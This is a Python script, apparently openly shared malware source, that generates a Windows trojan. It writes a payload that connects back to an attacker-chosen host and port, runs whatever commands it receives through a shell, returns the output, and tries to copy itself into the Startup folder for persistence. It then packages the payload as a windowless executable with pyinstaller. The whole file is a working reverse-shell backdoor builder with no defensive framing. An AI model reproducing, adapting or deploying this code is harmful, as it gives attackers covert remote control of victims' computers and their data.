'''Trojan Creator via Terminal'''
import os
import sys
import time

if __name__ == "__main__":
    try:
        print("Hello, use this program for create a simple trojan")
        print("This Arguments are mandatory")
        print("1º Arg --> Arquive Name")
        print("2º Arg --> LHOST, you can use a url to receive the connection")
        print("3º Arg --> LPORT")

        if len(sys.argv) >= 2:
            if len(sys.argv) >= 3:
                if len(sys.argv) >= 4:
                    filename = sys.argv[1]+".py"
                    address = sys.argv[2]
                    port = sys.argv[3]
                    with open(filename, "w") as trojan:
                        print(">>> Creating PY File...")
                        time.sleep(2)
                        trojan.write(
                        "import socket\n"
                        "import subprocess\n"
                        "import time\n"
                        "import threading\n"
                        "import sys\n"
                        "import os\n"
                        "IP = '{}'\n".format(address)+
                        "PORT = {}\n".format(port)+
                        "CONNETION = False\n"
                        +
r"""
def autorun():
    try:
        filename = os.path.basename(__file__)
    
        exe_fi = filename.replace(".py", ".exe")
        os.system("copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"")
    except:
        pass


def connect(IP, PORT):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((IP, PORT))
        return client
    except Exception as error:
        pass


def conectiontest(client):
    try:
        client.send(b" ")
    except:
        time.sleep(5)
        connect(IP, PORT)
    else:
        return


def conection():
    while True:
        client = connect(IP, PORT)
        if client:
            listen(client)

        else:
            
            time.sleep(3)


def cmd(client, data):
    try:
        client.send(b"")
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = proc.stdout.read()
        if output:
            client.send(output + b"\n")

        erroutput = proc.stderr.read()
        if erroutput:
            client.send(erroutput)

    except BrokenPipeError:
        pass
    except Exception as error:
        pass


def listen(client):
    try:

        while True:

            data = client.recv(1024).decode().strip()
            if data == "/exit":
                client.close()
            else:
                client.send(b" ")
                threading.Thread(target=cmd, args=(client, data)).start()

    except BrokenPipeError:
        time.sleep(5)
        pass
    except Exception as error:
        pass
        client.close()


if __name__ == "__main__":
    try:
        autorun()
        conection()
    except KeyboardInterrupt:
        pass
"""
                        )
                        print(">>> File {} Created".format(filename))

                    with open(filename, "r") as file:
                        file = file.read()
                        print(">>> Creating EXE File")
                        time.sleep(2)
                        os.system("pyinstaller -F -w --clean {}".format(file))
                        exefile = filename.replace(".py", ".exe")
                        try:
                            with open(exefile, "r") as exec:
                                print(">>>File {} Created".format(exefile))
                                print(">>>> Congratulation, now you have a Trojan :) <<<<")

                        except:
                            print(">>> EXEC FILE DON'T CREATED...")
                            print(">>> Please verify your pyinstaller library and try again")

        else:
            print(">>> No Args <<<")
    except Exception as err:
        print(err)

